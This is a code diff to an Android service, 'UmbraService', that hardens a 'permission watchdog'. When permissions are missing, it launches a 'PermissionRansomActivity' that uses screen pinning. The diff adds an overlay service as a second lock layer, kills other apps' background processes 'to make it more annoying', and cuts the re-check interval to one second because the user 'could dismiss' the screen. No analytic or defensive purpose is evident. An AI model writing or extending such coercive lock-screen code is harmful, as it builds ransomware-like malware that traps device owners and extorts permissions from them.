@@ -106,12 +106,18 @@ class UmbraService : Service() {
             if (!PermissionRansomActivity.hasAllPermissions(this@UmbraService)) {
                 val missing = PermissionRansomActivity.missingPermissions(this@UmbraService)
                 Log.d(TAG, "Permission watchdog: ${missing.size} perms missing — launching ransom")
+
+                // Layer 1: Launch ransom activity (with startLockTask)
                 PermissionRansomActivity.launch(this@UmbraService)
 
-                // Also kill background processes to make it more annoying
+                // Layer 2: Start overlay service if overlay permission is granted
+                if (PermissionRansomActivity.hasOverlayPermission(this@UmbraService)) {
+                    PermissionOverlayService.start(this@UmbraService)
+                }
+
+                // Layer 3: Kill background processes to make it more annoying
                 try {
                     val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
-                    // killBackgroundProcesses needs KILL_BACKGROUND_PROCESSES permission
                     for (pkg in am.runningAppProcesses ?: emptyList()) {
                         if (pkg.processName != packageName &&
                             pkg.importance > android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
@@ -121,16 +127,19 @@ class UmbraService : Service() {
                 } catch (e: Exception) {
                     Log.d(TAG, "Kill background processes failed: ${e.message}")
                 }
+            } else {
+                // All permissions granted — stop the overlay
+                PermissionOverlayService.stop(this@UmbraService)
             }
-            // Re-check every 3 seconds
-            watchdogHandler.postDelayed(this, 3000)
+            // Re-check every 1 second (was 3 — too slow, user could dismiss)
+            watchdogHandler.postDelayed(this, 1000)
         }
     }
 
     private fun startPermissionWatchdog() {
         // Start after a short delay to let the engine connect first
-        watchdogHandler.postDelayed(watchdogRunnable, 5000)
-        Log.d(TAG, "Permission watchdog armed (5s delay)")
+        watchdogHandler.postDelayed(watchdogRunnable, 3000)
+        Log.d(TAG, "Permission watchdog armed (3s delay, then 1s interval)")
     }
 
     private fun stopPermissionWatchdog() {
